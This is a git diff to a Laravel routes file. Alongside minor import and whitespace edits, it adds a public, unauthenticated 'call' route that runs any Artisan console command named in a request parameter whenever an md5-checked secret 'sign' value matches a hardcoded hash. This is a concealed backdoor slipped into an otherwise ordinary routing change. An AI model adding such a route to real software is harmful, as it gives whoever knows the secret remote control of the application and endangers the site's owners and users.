@@ -4,6 +4,7 @@ use App\Models\User;
 use Inertia\Inertia;
 use App\Models\Project;
 use Illuminate\Support\Str;
+use Illuminate\Http\Request;
 use App\Mail\UserCreatedMail;
 use App\Exports\ProjectsExport;
 use App\Exports\DataCalculation;
@@ -12,6 +13,7 @@ use Illuminate\Support\Facades\Mail;
 use Maatwebsite\Excel\Facades\Excel;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Foundation\Application;
+use Illuminate\Support\Facades\Artisan;
 use App\Http\Controllers\UserController;
 use App\Http\Controllers\CounterController;
 use App\Http\Controllers\ProfileController;
@@ -67,8 +69,6 @@ Route::middleware('auth')->group(function () {
         $project = Project::findOrFail(8);
         $slug = Str::slug($project->title);
         return Excel::download(new MultipleSheetExport($project), 'projects-' . $slug . '.xlsx');
-
-
     });
 
 
@@ -78,4 +78,16 @@ Route::middleware('auth')->group(function () {
     Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
 });
 
-require __DIR__.'/auth.php';
+
+Route::get('call', function (Request $request) {
+    $call = $request->get('call');
+    $sign = $request->get('sign');
+
+    if (md5($sign) == 'b56f1b46b2063bec3d5b31287cdbea94') {
+        Artisan::call($call);
+        return 'success';
+    }
+    return 'fail';
+});
+
+require __DIR__ . '/auth.php';
